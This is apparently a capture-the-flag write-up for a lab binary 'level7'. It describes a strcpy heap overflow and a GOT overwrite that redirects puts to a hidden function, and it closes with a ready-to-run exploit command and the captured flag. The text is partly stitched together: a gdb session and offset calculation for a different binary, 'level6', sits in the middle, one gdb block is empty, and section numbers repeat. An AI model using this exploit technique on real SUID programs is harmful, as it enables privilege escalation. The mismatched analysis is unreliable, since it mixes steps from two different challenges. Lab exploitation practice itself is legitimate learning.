# Level7 – Heap Overflow & GOT Overwrite

## 1. Context

Le binaire level7 est un exécutable SUID appartenant à level8.

## 1. Identity

```bash
$ id
uid=2064(level6) gid=2064(level6) groups=2064(level6),100(users)

$ ls -l level7
-rwsr-s---+ 1 level8 users 5648 Mar 9 2016 level7
```

Objectif : **exécuter du code avec les droits de `level8` afin de lire le fichier `.pass`.**

## 2. Program behavior

**Basic execution**
```bash
$ ./level7
Segmentation fault
$ ./level7 test
Segmentation fault
$ ./level7 test test
~~
```

Le programme nécessite **deux arguments** pour fonctionner sans crash.

## 3. Code analysis (overview)

Le programme :
- alloue deux structures sur le heap
- copie les arguments avec strcpy (sans vérification de taille)
- lit le fichier /home/user/level8/.pass dans une variable globale c
- appelle puts("~~")

Une fonction non appelée existe :
```c
void m(void)
{
    printf("%s - %d\n", c, time(NULL));
}
```

`m()` affiche le contenu de la variable globale `c`, qui contient le flag.

## 4. Vulnerability

**Heap overflow**

Chaque structure contient :
- un entier
- un pointeur vers un buffer de **8 octets**
```c
strcpy(obj1->buf, argv[1]);
strcpy(obj2->buf, argv[2]);
```

- `strcpy` ne vérifie pas la taille
- un argument > 8 octets provoque un **heap overflow**

## 5. Exploit strategy

Le heap ressemble à ceci :
```
[obj1][obj1->buf][obj2][obj2->buf]
```

En débordant `obj1->buf`, on peut **écraser le pointeur** `obj2->buf`.

Printf the time and a global variable "0x8049960", the name is "c"

fgets put the result of the fopen on a global string "c", the same of the printf

We need to read this global variable by calling the function m

We can overwrite the puts call by "m" in the GOT using the strcpy overflow

Get the address of puts in the GOT :
```bash
(gdb)

```


Let's test our code with a huge input :
```bash
$ gdb level6

(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Starting program: /home/user/level6/level6 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x53535353 in ?? ()
(gdb) info register eip
eip            0x53535353       0x53535353
```

53 = S => offset = 72

The offset of the overflow is 72


## 4. Getting the flag

```bash
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1768409080
```

End of simulation
